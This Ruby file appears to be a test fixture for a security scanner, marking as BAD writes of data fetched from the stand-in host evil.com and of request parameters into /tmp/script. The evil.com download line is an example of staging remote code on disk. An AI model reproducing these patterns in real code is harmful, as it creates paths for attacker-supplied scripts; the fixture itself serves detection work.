require "net/http"

resp = Net::HTTP.new("evil.com").get("/script").body
file = File.open("/tmp/script", "w")
file.write(resp) # BAD

class ExampleController < ActionController::Base
    def example
      script = params[:script]
      file = File.open("/tmp/script", "w")
      file.write(script) # BAD
    end

    def example2
      a = "a"
      file = File.open("/tmp/script", "w")
      file.write(a) # GOOD
    end
end